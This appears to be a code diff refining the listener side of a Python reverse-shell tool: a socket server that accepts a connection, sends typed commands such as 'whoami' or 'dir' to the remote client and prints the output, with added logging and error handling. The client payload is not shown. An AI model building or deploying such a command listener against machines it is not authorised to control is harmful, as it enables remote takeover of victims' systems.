@@ -27,32 +27,54 @@ def main():
         print(f"[!] Failed to bind: {e}")
         sys.exit(1)
 
+    print("[*] Waiting for connection...")
     client, addr = server.accept()
     print(f"[+] Connection received from {addr}")
     print("[*] You are now connected. Try typing 'whoami' or 'dir'.")
+    print("[*] Type 'exit' to quit.")
 
     while True:
         try:
+            # Ensure the prompt is always printed clearly
             cmd = input("\n# Command: ")
+            
             if cmd.lower() == 'exit':
+                print("[*] Sending exit command...")
                 client.send('exit'.encode())
                 break
             
+            print(f"[*] Sending command: {cmd}")
             client.send(cmd.encode())
             
-            result = client.recv(4096)
-            if result:
-                print("[Response from client]:")
-                print(result.decode())
-            else:
-                print("[!] Connection closed by remote host.")
+            # Wait for response with a timeout mechanism handled by the client sending data
+            # If the client sends the "Success" message, this will receive it.
+            data = client.recv(4096)
+            
+            if not data:
+                print("[!] Connection closed by remote host (No data received).")
                 break
+            
+            response = data.decode()
+            if response:
+                print("[Response from client]:")
+                print(response)
+            else:
+                print("[!] Received empty response. Something is wrong.")
+                
+        except KeyboardInterrupt:
+            print("\n[*] Interrupted by user. Closing connection.")
+            break
         except Exception as e:
-            print(f"[!] Error: {e}")
+            print(f"[!] Error occurred: {e}")
+            print("[*] Connection likely lost. Exiting.")
             break
 
-    client.close()
-    server.close()
+    try:
+        client.close()
+        server.close()
+    except:
+        pass
+    print("[*] Server shut down.")
 
 if __name__ == "__main__":
     main()
